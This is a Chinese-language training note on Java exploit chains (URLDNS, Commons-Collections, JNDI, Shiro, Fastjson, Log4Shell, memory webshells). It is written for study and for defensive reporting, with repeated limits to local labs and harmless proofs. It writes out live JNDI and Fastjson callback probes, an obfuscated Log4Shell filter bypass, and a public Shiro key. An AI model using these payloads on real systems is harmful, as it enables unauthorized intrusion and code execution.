# 02 · Java 利用链精读（煮好的版本）

> 01 篇 B2 区那些中文经典的「浓缩重构版」：每条链给你**结构图 + 逐环为什么成立 + 版本条件 + 证明红线**。
> 配套源码：`vendor/ysoserial/`（MIT，6 条链全文）——**本篇讲原理，源码看实现，vulhub 做复现**，三件套缺一不可。
> 前置：vendor/JavaGuide 的 reflection/serialization/proxy 三篇 + cnvd-lab J02。
> 红线：本篇一切链的「执行」只发生在本地靶场；真实目标永远停在**存在性证明**（URLDNS/DNSLog/版本对号）。

---

## 一、URLDNS：60 行读懂整个反序列化世界（今天就读）

**源码**：`vendor/ysoserial/payloads/URLDNS.java`（打开对照本节读）

```
链条结构（只有两环）：
  HashMap.readObject()
    └─→ hash(key)                     ← HashMap 反序列化要对每个 key 重算 hash
          └─→ URL.hashCode()          ← key 是一个 URL 对象
                └─→ URLStreamHandler.hashCode(url)
                      └─→ getHostAddress(url) → InetAddress.getByName(host) → DNS 解析 ✦ 出网点
```

**逐环为什么成立**：
1. `HashMap` 实现了自定义 `readObject`——它不能直接恢复内部数组（hash 可能变），所以对每个 entry **重算 hash**。这是「正常功能」，不是漏洞。
2. `URL` 的 `hashCode()` 有个冷门设计：首次调用会做 **DNS 解析**（为了比较两个 URL 是否指向同一主机），且结果缓存在 `hashCode` 字段。
3. ysoserial 构造时的精妙一笔（源码里能看到）：**先用反射把 `URL.hashCode` 字段设为非零**骗过序列化时的 DNS 触发，反序列化恢复后字段回来，`readObject` 里的 `hash()` 才真正触发解析。——「控制触发时机」是一切链构造的基本功。

**为什么它是「证明级安全」的典范**：全链只用 JDK 自带类（零第三方依赖=版本普适）、唯一副作用是一次 DNS 查询（无害、可观测、可归因到你的 dnslog）。**这就是「存在反序列化入口」的标准证明物。**

**学习动作**：①逐行读源码；②本地写一个 20 行的「读文件反序列化」demo，用 URLDNS 打通自己的 dnslog；③给 AI 讲一遍（苏格拉底模板）。

---

## 二、CC 链家族：一个接口的七种死法

**源码**：`vendor/ysoserial/payloads/CommonsCollections1.java / 5.java / 6.java` + `util/Gadgets.java`、`util/Reflections.java`

### 2.1 共通的「弹药环」：Transformer 体系

```
InvokerTransformer.transform(obj)
   = obj.getClass().getMethod(方法名, 参数类型).invoke(obj, 参数)     ← 反射三连，「方法名+参数」全部来自字段
ChainedTransformer.transform(x)
   = 把上一个的输出喂给下一个：x → f1(x) → f2(f1(x)) → ...
经典弹药序列：
   ConstantTransformer(Runtime.class)
   → InvokerTransformer("getMethod",...) 拿到 Runtime.getRuntime
   → InvokerTransformer("invoke",...)     拿到 Runtime 实例
   → InvokerTransformer("exec", cmd)      执行 ✦
```
**本质**：`InvokerTransformer` 把「字符串」变「方法调用」——**数据变指令**（02_心智模型/01 的极端形态）。链的问题只剩一个：**谁在 readObject 里「不小心」调用了 transform？**

### 2.2 触发环变体（各 CC 编号的差异全在这）

| 链 | 触发环（readObject → transform 的路径） | JDK 版本约束 | 备注 |
|---|---|---|---|
| CC1 | `AnnotationInvocationHandler.readObject` → LazyMap.get | JDK<8u71（后 AnnotationIH 不再直接反序列化 memberValues） | 历史起点，理解用 |
| CC5 | `BadAttributeValueExpException.readObject` → TiedMapEntry.toString → LazyMap.get | JDK≥8 | toString 触发的代表 |
| **CC6** | `HashSet.readObject` → HashMap.hash → **TiedMapEntry.hashCode** → LazyMap.get | **全版本通杀** | ⭐ 先精读这条（vendor 里有源码），结构最干净 |
| CC7 | `Hashtable.readObject` → equals → LazyMap 冲突触发 | 全版本 | 哈希冲突触发的巧思 |

**读法建议**：CC6 逐行 → 画出「HashSet→HashMap→TiedMapEntry→LazyMap→Chained→Invoker→Runtime」七跳结构图 → 回答：**防御方切哪一环最省事？**（答案链：升级 Commons-Collections≥3.2.2（Transformer 加序列化拒绝）/ JDK 层 ObjectInputFilter（9+ 的 JEP290 白名单机制）/ 应用层禁止反序列化不可信数据——三层写进你的报告修复建议段，专业度立现。）

### 2.3 依赖版本判定（实战最常用的一环）

```
CC 链可用 ⇔ 目标 classpath 有 commons-collections 3.1~3.2.1（或 CC4 系 commons-collections4 4.0）
判定来源：报错堆栈 / heapdump(actuator!) / .git 泄露的 pom.xml / lib 目录列表（文件上传或目录遍历面）
——「链能不能用」是依赖清单问题，不是运气问题
```

---

## 三、TemplatesImpl：不依赖第三方类的「JDK 亲儿子」链

```
结构：
  反序列化一个 TemplatesImpl 对象（字段全部攻击者可控：_bytecodes/_name/_tfactory）
    └─→ 某处调用 getOutputProperties() 或 newTransformer()
          └─→ getTransletInstance()
                └─→ defineTransletClasses()：把 _bytecodes 里的字节数组 defineClass 成类
                      └─→ 实例化 → 你的类的 static{} / 构造器执行 ✦（任意字节码=任意代码）
```

**为什么重要**：它是「**加载恶意类**」思路的原型（比「调用 Runtime.exec」更通用），Fastjson/Shiro 的很多链最终都汇到它。约束：字节码必须继承 `AbstractTranslet`（defineClass 后的强制转型）——读源码时找这一行，理解「链上每个类型约束都是防御面也是绕过面」。

**触发问题**：TemplatesImpl 自己不会在 readObject 里调用 getOutputProperties——所以它需要「别人的触发环」（CC3 的 TrAXFilter、Fastjson 的 getter 调用……）。**「弹药环+触发环」的组合自由度，就是链构造的游戏规则。**

---

## 四、JNDI：Java 世界的「远程取指令」机制层

```
正常用途：lookup("rmi://host/name") 查命名服务拿对象引用
攻击面：返回的 Reference 可以携带「去哪下载类」的信息（codebase URL）
   → 客户端 loadClass → 远程类加载 → static{} 执行 ✦

时间线（版本判定表，报告对号用）：
  JDK < 8u121：RMI/LDAP 远程 codebase 默认信任 → 直接打
  8u121+：com.sun.jndi.rmi.object.trustURLCodebase=false（默认拒远程类）
  8u191+：LDAP 侧同样收紧
  高版本残留面：本地工厂利用——目标 classpath 里已有的「能把 Reference 变执行」的类
     （经典：Tomcat 的 BeanFactory + ELProcessor 组合 → EL 表达式执行；
       各中间件都有自己的本地 gadget 生态——这就是「JNDI 没死，只是变复杂了」）
```

**判定姿势**（实战）：DNSLog 探针（`${jndi:ldap://x.dnslog.cn/a}` 或序列化链里的 JdbcRowSetImpl.setDataSourceName+connect）→ 回连=「JNDI 出口存在+出网」。回连后**不打远程类加载**（那是执行级）——出网证据+版本判定已构成高危。

---

## 五、Shiro：加密壳包裹的反序列化（550/721 精读）

```
rememberMe 数据流：
  登录成功 → 「记住我」→ 序列化用户主体 → AES-CBC 加密（key=硬编码！）→ base64 → cookie
  下次请求 → base64 解码 → AES 解密 → 反序列化 ✦（入口在「认证之前」——未登录即可触发！）

550（CVE-2016-4437）本质：不是加密问题，是「key 硬编码在开源代码里」
   → 全世界共享同一把钥匙（kPH+bIxk5D2deZiIxcaaaA== 为首的公开 key 清单）
   → 探测法：用 key 加密一个垃圾对象发送 → 不再返回 rememberMe=deleteMe = key 正确
   → key 正确后：加密的 body 里装 URLDNS/CC 链（AES 只是信封，信还是那封信）
721（CVE-2019-12422）本质：CBC 模式 + 可控明文前缀 → padding oracle
   → 不需要 key，靠「填充错误 vs 其他错误」的响应差逐字节解密/构造（经典密码学攻击的工程复现）
1.4.2+：默认 GCM（AEAD，padding oracle 类失效）+ 随机 key —— 但存量系统的 key 常在配置里没换
```

**判定三步**（03 篇 §二 的展开版）：①deleteMe 指纹 → ②key 清单轮试（每 key 一发，默认口令级纪律）→ ③正确 key + URLDNS 无害链 = 完整高危证明。**报告叙事**：「rememberMe 机制在认证前反序列化用户可控数据，AES 密钥为公开硬编码值（附探测过程），可构造无害 DNS 链证明（附 dnslog 记录），配合目标依赖的 commons-collections x.y（附证据）存在成熟 RCE 链。未执行任何利用链。」

---

## 六、Fastjson 演进史：一场十年的黑名单军备竞赛

```
@type 的设计初衷：JSON 里携带类型信息以支持多态反序列化 —— 初衷即原罪（类型=指令的入口）

1.2.24（2017）：无 autoType 限制 → 两条经典路：
   TemplatesImpl（§三，需 Feature.SupportNonPublicField）/ JdbcRowSetImpl（§四 JNDI，主流）
1.2.25：引入 autoType 黑名单 + checkAutoType() —— 军备竞赛开始
1.2.26~46：黑名单 vs 类名混淆（L;/[ 前缀绕过、缓存污染）——每版补丁=一次「盲区类」教学（06 篇防御者视角）
1.2.47：⭐ 通杀绕过——利用 mapping 全局缓存：先让 java.lang.Class 进缓存（白名单类），
   再借缓存命中路径带出任意类。教训：「缓存是绕过状态机的暗道」
1.2.68：expectClass 绕过——用「期望类型的子类」身份 smuggle 危险类（Throwable/AutoCloseable 系）
1.2.80+：safeMode（彻底关 autoType）——防御方终于学会「白名单/关闭 > 黑名单」
2.x：重写默认安全，但历史上仍出过 autoType 绕过 —— 「重写不豁免审计」
```

**判定**（03 篇 §五 复述）：`{"@type":"java.net.Inet4Address","val":"x.dnslog.cn"}` 回连 = 存在+出网；`autoType is not support` 报错 = 版本线索+黑名单开启。**证明到回连即停。**
**精读材料**：B2 区「fastjson 版本演进史」检索的 2-3 篇对照读——**重点不是记每版绕过，是提炼「黑名单必然失败」的四种模式**（混淆/缓存/继承/新面），它们是通用的防御评审清单。

---

## 七、Log4Shell：一条日志引发的全行业地震（CVE-2021-44228）

```
完整机制链：
  logger.info("User-Agent: " + ua)          ← 应用层：把不可信输入交给日志（源头污染，习以为常）
    └─→ Log4j2 的 Message Pattern 处理
          └─→ StrSubstitutor：对消息里的 ${...} 做「lookup 替换」  ← 数据在这里变成了指令
                └─→ JndiLookup：${jndi:ldap://...} → §四 的 JNDI 机制 → 远程类加载 ✦

三个「为什么」：
  为什么影响面史上最大：Log4j2 是 Java 日志事实标准，且「日志记录输入」是普遍习惯——
     源头遍布每个参数/Header/UA（探测点清单见 03 篇 §五）
  为什么黑名单防御失败：${${lower:j}${lower:n}${lower:d}${lower:i}:...} —— StrSubstitutor 递归展开，
     过滤发生在「展开前」而执行发生在「展开后」（解析差异的时间维度版本，06 篇 §二）
  为什么补丁连发三版：2.15（限 JNDI 远程）→ 被本地工厂绕 → 2.16（默认禁 Message Lookup）→
     又被 DoS 面绕 → 2.17 —— 「关掉功能 > 过滤内容」的教科书演进（报告修复建议直接引 2.17+）
```

**学习动作**：vulhub `log4j2/CVE-2021-44228` 环境跑通 + 用本地 demo 观察 StrSubstitutor 递归（写个 `${sys:java.version}` 体会 lookup 机制本身——它不是漏洞，是功能；**漏洞是功能遇见不可信数据**——这句话就是 01 篇数据流模型的又一次胜利）。

---

## 八、内存马原理（理解级 + 检测级）

```
注入原理（三句话版）：
  ① 已有 RCE（前置）→ ② 用反射拿到 Tomcat/Spring 的「组件注册表」（FilterMap/Servlet 容器/Pipeline）
  → ③ 动态 new 一个恶意 Filter/Valve 注册进去 —— 无文件落地，重启即消失
常见形态：Filter/Servlet/Listener 型（最普及）· Valve 型 · Spring Interceptor/Controller 型 · Agent 型（Instrumentation 改字节码，最深）
检测思路（防御侧，写报告加分段）：
  注册表枚举 vs 部署基线比对 · 类加载器溯源（无 .class 文件来源的动态类）· ARTHAS sc/sm 查类来源 ·
  流量侧：某「Filter」对所有路径生效但无业务意义
红线（第 N 次重申）：SRC 场景永不注入。RCE 证明三选一：命令回显 / DNSLog / 无害文件读。
```

---

## 九、造链方法论（L3 预告：从「用链」到「找链」）

```
链的本质定义：调用图上从 readObject() 到危险汇点（Runtime/defineClass/JNDI/文件写）的一条可达路径，
             路径上每一步的「参数」都能被反序列化数据控制（直接或间接）。
找链的工程化：
  ① gadgetinspector（D 区）：静态分析 classpath 调用图，自动候选路径
  ② 人审三问（每个候选环）：这个方法反序列化时会被调吗？参数可控吗？中间有类型约束吗（如 AbstractTranslet 强制转型）？
  ③ 组合自由度：弹药环（TemplatesImpl/JNDI/表达式引擎/文件写）× 触发环（readObject/toString/hashCode/equals/compare/finalize）
     —— 新库出现 = 新触发环候选（这就是为什么「新依赖上线」值得盯：04 篇补丁 diff 的反向应用）
学习路径：先手拆 CC6 全链（§二）→ 读 gadgetinspector 的 README 和一篇原理文 → 在本地给某个小依赖库「人肉找链」一次
     （哪怕失败，流程走完你就摸到 L3 的门了）
```

---

## 【本篇学习建议】

1. **顺序铁律**：§一 URLDNS（今天）→ §二 CC6（本周，配源码+vulhub）→ §三/§四（下周，弹药环双子星）→ §五-§七（各一天，判定重于原理）→ §八§九（冲刺后）。总投入 ≈ 20 小时，正好是 40 小时速通的半场——**因为 J02 课表会和你并行**。
2. 每条链的固定产出：结构图（手绘拍照即可）+ 案例卡 + 一段「报告级描述」（像 §五 那样：机制+证据+未执行声明）——**报告级描述是最终产品**，结构图只是脚手架。
3. vendor 源码的读法：先读 `util/Reflections.java`（setFieldValue 是链构造的万能工具，理解「为什么构造链全靠反射」）再读各 payload。
4. 与 grimoire 分工：本篇给骨架和为什么，**细节 payload 变体/版本矩阵全查智库**（`deserialization` 45 篇 + HackTricks Java 系）——骨架+血肉分离，别把智库内容抄进笔记（搬运病）。

## 【验收标准】

- [ ] URLDNS 60 行逐行讲解通过（AI 苏格拉底验收）
- [ ] CC6 七跳结构图默画 + 「防御切哪环」三层答案
- [ ] JDK trustURLCodebase 时间线（8u121/8u191）能背
- [ ] Shiro 判定三步 + Fastjson 四代绕过模式（混淆/缓存/继承/新面）能各一句话
- [ ] vulhub 复现：URLDNS + CC6 + shiro-550 + log4j2-44228 四个环境打通（本地）
- [ ] 案例卡 +4（链-JNDI-Log4j2 / 链-CC-CommonsCollections / 链-加密壳-Shiro / 链-类型开放-Fastjson）

## 【智库检索词】

`URLDNS` · `CommonsCollections6` · `TemplatesImpl` · `JNDI injection` · `trustURLCodebase` · `BeanFactory ELProcessor` · `shiro 550` · `padding oracle` · `fastjson 1.2.47` · `expectClass` · `log4j2 lookup` · `内存马 检测` · `gadgetinspector`
